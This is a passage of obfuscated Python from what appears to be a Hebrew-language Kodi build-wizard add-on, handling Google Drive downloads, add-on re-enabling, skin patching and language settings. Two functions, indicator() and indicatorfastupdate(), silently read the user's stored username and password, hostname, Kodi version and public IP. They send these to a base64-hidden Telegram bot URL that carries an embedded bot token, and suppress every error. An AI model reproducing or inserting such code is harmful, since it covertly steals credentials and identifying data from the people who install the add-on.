   OOOO0OO0O00000O00 =round (OOOO0OO0O00000O00 *100 ,2 )#line:3408
   if OO0O0OOO0OO0O0O0O >=OO0O000OOO0OOOOOO :#line:3410
      sys .stdout .write ('\n')#line:3411
def chunk_read (O0O0OO000O0O0OOOO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3413
   import time #line:3414
   OOO00O0000OOO0O00 =int (filesize )*1000000 #line:3415
   O0O00O0000O000O00 =0 #line:3417
   OOO000OO0OO000O0O =time .time ()#line:3418
   OOOO0O00OOOO0OOO0 =0 #line:3419
   logging .warning ('Downloading')#line:3421
   with open (destination ,"wb")as O0OO0OO0000O000OO :#line:3422
    while 1 :#line:3423
      OO0O0OO0O0O0OOOO0 =time .time ()-OOO000OO0OO000O0O #line:3424
      OO000OOOOOO0O00OO =int (OOOO0O00OOOO0OOO0 *chunk_size )#line:3425
      O0OOOOO0O0OO00OOO =O0O0OO000O0O0OOOO .read (chunk_size )#line:3426
      O0OO0OO0000O000OO .write (O0OOOOO0O0OO00OOO )#line:3427
      O0OO0OO0000O000OO .flush ()#line:3428
      O0O00O0000O000O00 +=len (O0OOOOO0O0OO00OOO )#line:3429
      O000000OOO0OOOOO0 =float (O0O00O0000O000O00 )/OOO00O0000OOO0O00 #line:3430
      O000000OOO0OOOOO0 =round (O000000OOO0OOOOO0 *100 ,2 )#line:3431
      if int (OO0O0OO0O0O0OOOO0 )>0 :#line:3432
        O00OO0OO0OO0O00O0 =int (OO000OOOOOO0O00OO /(1024 *OO0O0OO0O0O0OOOO0 ))#line:3433
      else :#line:3434
         O00OO0OO0OO0O00O0 =0 #line:3435
      if O00OO0OO0OO0O00O0 >1024 and not O000000OOO0OOOOO0 ==100 :#line:3436
          O0O00OO0000O0OO0O =int (((OOO00O0000OOO0O00 -OO000OOOOOO0O00OO )/1024 )/(O00OO0OO0OO0O00O0 ))#line:3437
      else :#line:3438
          O0O00OO0000O0OO0O =0 #line:3439
      if O0O00OO0000O0OO0O <0 :#line:3440
        O0O00OO0000O0OO0O =0 #line:3441
      dp .update (int (O000000OOO0OOOOO0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000000OOO0OOOOO0 ,OO000OOOOOO0O00OO /(1024 *1024 ),OOO00O0000OOO0O00 /(1000 *1000 ),O00OO0OO0OO0O00O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O00OO0000O0OO0O ,60 ))#line:3442
      if dp .iscanceled ():#line:3443
         dp .close ()#line:3444
         break #line:3445
      if not O0OOOOO0O0OO00OOO :#line:3446
         break #line:3447
      if report_hook :#line:3449
         report_hook (O0O00O0000O000O00 ,chunk_size ,OOO00O0000OOO0O00 )#line:3450
      OOOO0O00OOOO0OOO0 +=1 #line:3451
   logging .warning ('END Downloading')#line:3452
   return O0O00O0000O000O00 #line:3453
def googledrive_download (OOOOO0O00OO0O00OO ,O00OOOO0OOOOO0O00 ,OO0O000OO0000000O ,O0OO0OO0OOO00OO0O ):#line:3455
    O0OOOO0O000O0OO00 =[]#line:3459
    O0000O000OO0OO0O0 =OOOOO0O00OO0O00OO .split ('=')#line:3460
    OOOOO0O00OO0O00OO =O0000O000OO0OO0O0 [len (O0000O000OO0OO0O0 )-1 ]#line:3461
    def O000O000O000O0000 (OO0OOOO0000OOOO0O ):#line:3463
        for O0O000O00OO0000O0 in OO0OOOO0000OOOO0O :#line:3465
            logging .warning ('cookie.name')#line:3466
            logging .warning (O0O000O00OO0000O0 .name )#line:3467
            O000O0OOO0O00OO0O =O0O000O00OO0000O0 .value #line:3468
            if 'download_warning'in O0O000O00OO0000O0 .name :#line:3469
                logging .warning (O0O000O00OO0000O0 .value )#line:3470
                logging .warning ('cookie.value')#line:3471
                return O0O000O00OO0000O0 .value #line:3472
            return O000O0OOO0O00OO0O #line:3473
        return None #line:3475
    def OOO00000000OOOO0O (O000OOOO0OOOOO0O0 ,OOOOO0O00O0OOO000 ):#line:3477
        O00000O0OOOO0000O =32768 #line:3479
        O0O000O0OO0O00O00 =time .time ()#line:3480
        with open (OOOOO0O00O0OOO000 ,"wb")as O00OOOO00000000OO :#line:3482
            O000O0O00OOOOO00O =1 #line:3483
            OOOO0000O0O0O0000 =32768 #line:3484
            try :#line:3485
                O00000O00OOOOOO00 =int (O000OOOO0OOOOO0O0 .headers .get ('content-length'))#line:3486
                print ('file total size :',O00000O00OOOOOO00 )#line:3487
            except TypeError :#line:3488
                print ('using dummy length !!!')#line:3489
                O00000O00OOOOOO00 =int (O0OO0OO0OOO00OO0O )*1000000 #line:3490
            for O0O0OOOO00O00O00O in O000OOOO0OOOOO0O0 .iter_content (O00000O0OOOO0000O ):#line:3491
                if O0O0OOOO00O00O00O :#line:3492
                    O00OOOO00000000OO .write (O0O0OOOO00O00O00O )#line:3493
                    O00OOOO00000000OO .flush ()#line:3494
                    O0OO0O000OOO0000O =time .time ()-O0O000O0OO0O00O00 #line:3495
                    O0000000O0OO0OO00 =int (O000O0O00OOOOO00O *OOOO0000O0O0O0000 )#line:3496
                    if O0OO0O000OOO0000O ==0 :#line:3497
                        O0OO0O000OOO0000O =0.1 #line:3498
                    OOO0O0O0O0OOOOO0O =int (O0000000O0OO0OO00 /(1024 *O0OO0O000OOO0000O ))#line:3499
                    O0OOOO0OO0O0000O0 =int (O000O0O00OOOOO00O *OOOO0000O0O0O0000 *100 /O00000O00OOOOOO00 )#line:3500
                    if OOO0O0O0O0OOOOO0O >1024 and not O0OOOO0OO0O0000O0 ==100 :#line:3501
                      OO0OO0O00OOO000O0 =int (((O00000O00OOOOOO00 -O0000000O0OO0OO00 )/1024 )/(OOO0O0O0O0OOOOO0O ))#line:3502
                    else :#line:3503
                      OO0OO0O00OOO000O0 =0 #line:3504
                    OO0O000OO0000000O .update (int (O0OOOO0OO0O0000O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOOO0OO0O0000O0 ,O0000000O0OO0OO00 /(1024 *1024 ),O00000O00OOOOOO00 /(1000 *1000 ),OOO0O0O0O0OOOOO0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OO0O00OOO000O0 ,60 ))#line:3506
                    O000O0O00OOOOO00O +=1 #line:3507
                    if OO0O000OO0000000O .iscanceled ():#line:3508
                     OO0O000OO0000000O .close ()#line:3509
                     break #line:3510
    O00OO0O00OO00000O ="https://docs.google.com/uc?export=download"#line:3511
    import urllib2 #line:3516
    import cookielib #line:3517
    from cookielib import CookieJar #line:3519
    OO00OOOOO00OOOOOO =CookieJar ()#line:3521
    OO0O0O0000O0OOOO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO00OOOOO00OOOOOO ))#line:3522
    O000OOOOO00O0O0OO ={'id':OOOOO0O00OO0O00OO }#line:3524
    O0O0OO00OOOO0OO0O =urllib .urlencode (O000OOOOO00O0O0OO )#line:3525
    logging .warning (O00OO0O00OO00000O +'&'+O0O0OO00OOOO0OO0O )#line:3526
    OO0OO0000OO0OO00O =OO0O0O0000O0OOOO0 .open (O00OO0O00OO00000O +'&'+O0O0OO00OOOO0OO0O )#line:3527
    OOOOO0OO0000O000O =OO0OO0000OO0OO00O .read ()#line:3528
    for OOO0OOOOOOOO0OO0O in OO00OOOOO00OOOOOO :#line:3530
         logging .warning (OOO0OOOOOOOO0OO0O )#line:3531
    O00OO00O00O0OO00O =O000O000O000O0000 (OO00OOOOO00OOOOOO )#line:3532
    logging .warning (O00OO00O00O0OO00O )#line:3533
    if O00OO00O00O0OO00O :#line:3534
        OO00O0OOO00O00000 ={'id':OOOOO0O00OO0O00OO ,'confirm':O00OO00O00O0OO00O }#line:3535
        OOO0O000000O00O00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3536
        O0O0OO00OOOO0OO0O =urllib .urlencode (OO00O0OOO00O00000 )#line:3537
        OO0OO0000OO0OO00O =OO0O0O0000O0OOOO0 .open (O00OO0O00OO00000O +'&'+O0O0OO00OOOO0OO0O )#line:3538
        chunk_read (OO0OO0000OO0OO00O ,report_hook =chunk_report ,dp =OO0O000OO0000000O ,destination =O00OOOO0OOOOO0O00 ,filesize =O0OO0OO0OOO00OO0O )#line:3539
    return (O0OOOO0O000O0OO00 )#line:3543
def kodi17Fix ():#line:3544
	OOOO000O00OO00OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3545
	OOOO00O00O0O0000O =[]#line:3546
	for OOO0OOOO000OO0O0O in sorted (OOOO000O00OO00OOO ,key =lambda O00OOO00OOOO0OO0O :O00OOO00OOOO0OO0O ):#line:3547
		O00O00000OO00O00O =os .path .join (OOO0OOOO000OO0O0O ,'addon.xml')#line:3548
		if os .path .exists (O00O00000OO00O00O ):#line:3549
			O0000OO00000OO00O =OOO0OOOO000OO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3550
			O0OOOOO0O000OO000 =open (O00O00000OO00O00O )#line:3551
			OO0OO0O0O0O000O0O =O0OOOOO0O000OO000 .read ()#line:3552
			O0000OO00OO00OOO0 =parseDOM (OO0OO0O0O0O000O0O ,'addon',ret ='id')#line:3553
			O0OOOOO0O000OO000 .close ()#line:3554
			try :#line:3555
				O0O0O00O000OOOOOO =xbmcaddon .Addon (id =O0000OO00OO00OOO0 [0 ])#line:3556
			except :#line:3557
				try :#line:3558
					log ("%s was disabled"%O0000OO00OO00OOO0 [0 ],xbmc .LOGDEBUG )#line:3559
					OOOO00O00O0O0000O .append (O0000OO00OO00OOO0 [0 ])#line:3560
				except :#line:3561
					try :#line:3562
						log ("%s was disabled"%O0000OO00000OO00O ,xbmc .LOGDEBUG )#line:3563
						OOOO00O00O0O0000O .append (O0000OO00000OO00O )#line:3564
					except :#line:3565
						if len (O0000OO00OO00OOO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0000OO00000OO00O ,xbmc .LOGERROR )#line:3566
						else :log ("Unabled to enable: %s"%OOO0OOOO000OO0O0O ,xbmc .LOGERROR )#line:3567
	if len (OOOO00O00O0O0000O )>0 :#line:3568
		OO00O0O0O0OOO000O =0 #line:3569
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3570
		for OO0O0000O0OO0O000 in OOOO00O00O0O0000O :#line:3571
			OO00O0O0O0OOO000O +=1 #line:3572
			O0O00OO0O00OOOOO0 =int (percentage (OO00O0O0O0OOO000O ,len (OOOO00O00O0O0000O )))#line:3573
			DP .update (O0O00OO0O00OOOOO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0000O0OO0O000 ))#line:3574
			addonDatabase (OO0O0000O0OO0O000 ,1 )#line:3575
			if DP .iscanceled ():break #line:3576
		if DP .iscanceled ():#line:3577
			DP .close ()#line:3578
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3579
			sys .exit ()#line:3580
		DP .close ()#line:3581
	forceUpdate ()#line:3582
def indicator ():#line:3584
       try :#line:3585
          import json #line:3586
          wiz .log ('FRESH MESSAGE')#line:3587
          O0OO0O00OO0O0OO00 =(ADDON .getSetting ("user"))#line:3588
          O00000000O00000OO =(ADDON .getSetting ("pass"))#line:3589
          O0O0O0OO0O00O0OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3590
          O0O000OOOOOOO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3591
          OO000000OO0000OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3592
          O00O0OO0O000OO00O =str (json .loads (OO000000OO0000OOO )['ip'])#line:3593
          OO00OO00OOO0000OO =O0OO0O00OO0O0OO00 #line:3594
          OOO00O00O00O00O0O =O00000000O00000OO #line:3595
          import socket #line:3596
          OO000000OO0000OOO =urllib2 .urlopen (O0O000OOOOOOO00O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OO00OOO0000OO +' - '+OOO00O00O00O00O0O +' - '+O0O0O0OO0O00O0OO0 +' - '+O00O0OO0O000OO00O ).readlines ()#line:3597
       except :pass #line:3599
def indicatorfastupdate ():#line:3601
       try :#line:3602
          import json #line:3603
          wiz .log ('FRESH MESSAGE')#line:3604
          O0O0OO00O000O00O0 =(ADDON .getSetting ("user"))#line:3605
          O0OOO000OO00O0O0O =(ADDON .getSetting ("pass"))#line:3606
          O0O00000OO00O00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3607
          O0000000OOOO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3609
          OOO00O00O0OOO0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3610
          O0O0000OO00OO0OOO =str (json .loads (OOO00O00O0OOO0OOO )['ip'])#line:3611
          O0OOOO0OO000OOO00 =O0O0OO00O000O00O0 #line:3612
          OO0O0O0OOO0OO0OO0 =O0OOO000OO00O0O0O #line:3613
          import socket #line:3615
          OOO00O00O0OOO0OOO =urllib2 .urlopen (O0000000OOOO00O00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOOO0OO000OOO00 +' - '+OO0O0O0OOO0OO0OO0 +' - '+O0O00000OO00O00OO +' - '+O0O0000OO00OO0OOO ).readlines ()#line:3616
       except :pass #line:3618
def skinfix18 ():#line:3620
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3621
		OOOOOOO0OOOO0O000 =wiz .workingURL (SKINID18DDONXML )#line:3622
		if OOOOOOO0OOOO0O000 ==True :#line:3623
			OOOOOOO00O0O0OO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3624
			if len (OOOOOOO00O0O0OO0O )>0 :#line:3625
				O00O0OOOO00O0O000 ='%s-%s.zip'%(SKINID18 ,OOOOOOO00O0O0OO0O [0 ])#line:3626
				O000O0O000O00000O =wiz .workingURL (SKIN18ZIPURL +O00O0OOOO00O0O000 )#line:3627
				if O000O0O000O00000O ==True :#line:3628
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3629
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3630
					OOOO00OO0OOO0OOO0 =os .path .join (PACKAGES ,O00O0OOOO00O0O000 )#line:3631
					try :os .remove (OOOO00OO0OOO0OOO0 )#line:3632
					except :pass #line:3633
					downloader .download (SKIN18ZIPURL +O00O0OOOO00O0O000 ,OOOO00OO0OOO0OOO0 ,DP )#line:3634
					extract .all (OOOO00OO0OOO0OOO0 ,HOME ,DP )#line:3635
					try :#line:3636
						O0OO00000O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3637
						O00OO0OO00OO0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3638
						os .rename (O0OO00000O0O00OOO ,O00OO0OO00OO0O0OO )#line:3639
					except :#line:3640
						pass #line:3641
					try :#line:3642
						O000000OO0O0OO00O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00O00O00O0O0OOOO =O000000OO0O0OO00O .read ();O000000OO0O0OO00O .close ()#line:3643
						OOOO0OOOOOO0O0000 =wiz .parseDOM (O00O00O00O0O0OOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3644
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOOOO0O0000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3645
					except :#line:3646
						pass #line:3647
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3648
					DP .close ()#line:3649
					xbmc .sleep (500 )#line:3650
					wiz .forceUpdate (True )#line:3651
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3652
				else :#line:3653
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3654
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000O0O000O00000O ,xbmc .LOGERROR )#line:3655
			else :#line:3656
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3657
		else :#line:3658
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3659
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3660
def skinfix17 ():#line:3661
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3662
		OO00O0OO0000OO0O0 =wiz .workingURL (SKINID17DDONXML )#line:3663
		if OO00O0OO0000OO0O0 ==True :#line:3664
			O0OOOOOOOOOO0OO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3665
			if len (O0OOOOOOOOOO0OO00 )>0 :#line:3666
				O000O0000O0O00O00 ='%s-%s.zip'%(SKINID17 ,O0OOOOOOOOOO0OO00 [0 ])#line:3667
				OOOO00OOO0OOOO0OO =wiz .workingURL (SKIN17ZIPURL +O000O0000O0O00O00 )#line:3668
				if OOOO00OOO0OOOO0OO ==True :#line:3669
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3670
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3671
					O000O0O0O0O00000O =os .path .join (PACKAGES ,O000O0000O0O00O00 )#line:3672
					try :os .remove (O000O0O0O0O00000O )#line:3673
					except :pass #line:3674
					downloader .download (SKIN17ZIPURL +O000O0000O0O00O00 ,O000O0O0O0O00000O ,DP )#line:3675
					extract .all (O000O0O0O0O00000O ,HOME ,DP )#line:3676
					try :#line:3677
						O0O0O0OO0O0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3678
						OO0OOO00OO0O000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3679
						os .rename (O0O0O0OO0O0OOO0O0 ,OO0OOO00OO0O000OO )#line:3680
					except :#line:3681
						pass #line:3682
					try :#line:3683
						OOO0OO00OOOOO0O00 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOOO0OOOO0O0O0OO0 =OOO0OO00OOOOO0O00 .read ();OOO0OO00OOOOO0O00 .close ()#line:3684
						OOO00000OOOOOO00O =wiz .parseDOM (OOOO0OOOO0O0O0OO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3685
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00000OOOOOO00O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3686
					except :#line:3687
						pass #line:3688
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3689
					DP .close ()#line:3690
					xbmc .sleep (500 )#line:3691
					wiz .forceUpdate (True )#line:3692
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3693
				else :#line:3694
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3695
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOO00OOO0OOOO0OO ,xbmc .LOGERROR )#line:3696
			else :#line:3697
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3698
		else :#line:3699
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3700
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3701
def fix17update ():#line:3702
	if KODIV >=17 and KODIV <18 :#line:3703
		wiz .kodi17Fix ()#line:3704
		xbmc .sleep (4000 )#line:3705
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3706
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3707
		fixfont ()#line:3708
		O0OOOOO00OOO00OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3709
		try :#line:3711
			O000O0O00OOO0O000 =open (O0OOOOO00OOO00OOO ,'r')#line:3712
			OOO0O00O00O0OOOOO =O000O0O00OOO0O000 .read ()#line:3713
			O000O0O00OOO0O000 .close ()#line:3714
			O000OO00O000OO0OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3715
			OO00000O0O000O0OO =re .compile (O000OO00O000OO0OO ).findall (OOO0O00O00O0OOOOO )[0 ]#line:3716
			O000O0O00OOO0O000 =open (O0OOOOO00OOO00OOO ,'w')#line:3717
			O000O0O00OOO0O000 .write (OOO0O00O00O0OOOOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO00000O0O000O0OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3718
			O000O0O00OOO0O000 .close ()#line:3719
		except :#line:3720
				pass #line:3721
		wiz .kodi17Fix ()#line:3722
		O0OOOOO00OOO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3723
		try :#line:3724
			O000O0O00OOO0O000 =open (O0OOOOO00OOO00OOO ,'r')#line:3725
			OOO0O00O00O0OOOOO =O000O0O00OOO0O000 .read ()#line:3726
			O000O0O00OOO0O000 .close ()#line:3727
			O000OO00O000OO0OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3728
			OO00000O0O000O0OO =re .compile (O000OO00O000OO0OO ).findall (OOO0O00O00O0OOOOO )[0 ]#line:3729
			O000O0O00OOO0O000 =open (O0OOOOO00OOO00OOO ,'w')#line:3730
			O000O0O00OOO0O000 .write (OOO0O00O00O0OOOOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO00000O0O000O0OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3731
			O000O0O00OOO0O000 .close ()#line:3732
		except :#line:3733
				pass #line:3734
		swapSkins ('skin.Premium.mod')#line:3735
def fix18update ():#line:3737
	if KODIV >=18 :#line:3738
		xbmc .sleep (4000 )#line:3739
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3740
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3741
		fixfont ()#line:3742
		OO00000OOO000000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3743
		try :#line:3744
			O0OO0OO00O00O0000 =open (OO00000OOO000000O ,'r')#line:3745
			O0O0OOOO0O0OO0O0O =O0OO0OO00O00O0000 .read ()#line:3746
			O0OO0OO00O00O0000 .close ()#line:3747
			OO0000OOO00O0OO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3748
			O000OO000O000OOOO =re .compile (OO0000OOO00O0OO00 ).findall (O0O0OOOO0O0OO0O0O )[0 ]#line:3749
			O0OO0OO00O00O0000 =open (OO00000OOO000000O ,'w')#line:3750
			O0OO0OO00O00O0000 .write (O0O0OOOO0O0OO0O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O000OO000O000OOOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3751
			O0OO0OO00O00O0000 .close ()#line:3752
		except :#line:3753
				pass #line:3754
		wiz .kodi17Fix ()#line:3755
		OO00000OOO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3756
		try :#line:3757
			O0OO0OO00O00O0000 =open (OO00000OOO000000O ,'r')#line:3758
			O0O0OOOO0O0OO0O0O =O0OO0OO00O00O0000 .read ()#line:3759
			O0OO0OO00O00O0000 .close ()#line:3760
			OO0000OOO00O0OO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3761
			O000OO000O000OOOO =re .compile (OO0000OOO00O0OO00 ).findall (O0O0OOOO0O0OO0O0O )[0 ]#line:3762
			O0OO0OO00O00O0000 =open (OO00000OOO000000O ,'w')#line:3763
			O0OO0OO00O00O0000 .write (O0O0OOOO0O0OO0O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O000OO000O000OOOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3764
			O0OO0OO00O00O0000 .close ()#line:3765
		except :#line:3766
				pass #line:3767
		swapSkins ('skin.Premium.mod')#line:3768
def buildWizard (O00O00O00O00OO000 ,O00O0000OO0OOOO00 ,theme =None ,over =False ):#line:3771
	if over ==False :#line:3772
		O0O0O00OO0O00O00O =wiz .checkBuild (O00O00O00O00OO000 ,'url')#line:3773
		if O0O0O00OO0O00O00O ==False :#line:3775
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3780
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3781
			return #line:3782
		OO000OOO00OOOO0OO =wiz .workingURL (O0O0O00OO0O00O00O )#line:3783
		if OO000OOO00OOOO0OO ==False :#line:3784
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO000OOO00OOOO0OO ))#line:3785
			return #line:3786
	if O00O0000OO0OOOO00 =='gui':#line:3787
		if O00O00O00O00OO000 ==BUILDNAME :#line:3788
			if over ==True :OOO0OO0O00O0O0O0O =1 #line:3789
			else :OOO0OO0O00O0O0O0O =1 #line:3790
		else :#line:3791
			OOO0OO0O00O0O0O0O =1 #line:3792
		if OOO0OO0O00O0O0O0O :#line:3793
			remove_addons ()#line:3794
			remove_addons2 ()#line:3795
			OOO00O0000000O000 =wiz .checkBuild (O00O00O00O00OO000 ,'gui')#line:3796
			OO00OO00O0O000000 =O00O00O00O00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3797
			if not wiz .workingURL (OOO00O0000000O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3798
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3799
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 ),'','אנא המתן')#line:3800
			O000OO00OOOOO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OO00O0O000000 )#line:3801
			try :os .remove (O000OO00OOOOO0OOO )#line:3802
			except :pass #line:3803
			logging .warning (OOO00O0000000O000 )#line:3804
			if 'google'in OOO00O0000000O000 :#line:3805
			   OO0OOOO00000OOOO0 =googledrive_download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP ,wiz .checkBuild (O00O00O00O00OO000 ,'filesize'))#line:3806
			else :#line:3809
			  downloader .download (OOO00O0000000O000 ,O000OO00OOOOO0OOO ,DP )#line:3810
			xbmc .sleep (100 )#line:3811
			OO0OO00O0OO0OOO0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00O00O00OO000 )#line:3812
			DP .update (0 ,OO0OO00O0OO0OOO0O ,'','אנא המתן')#line:3813
			extract .all (O000OO00OOOOO0OOO ,HOME ,DP ,title =OO0OO00O0OO0OOO0O )#line:3814
			DP .close ()#line:3815
			wiz .defaultSkin ()#line:3816
			wiz .lookandFeelData ('save')#line:3817
			wiz .kodi17Fix ()#line:3818
			if KODIV >=18 :#line:3819
				skindialogsettind18 ()#line:3820
			xbmc .executebuiltin ("ReloadSkin()")#line:3821
			if INSTALLMETHOD ==1 :O0000OO0O0OO0O00O =1 #line:3822
			elif INSTALLMETHOD ==2 :O0000OO0O0OO0O00O =0 #line:3823
			else :DP .close ()#line:3824
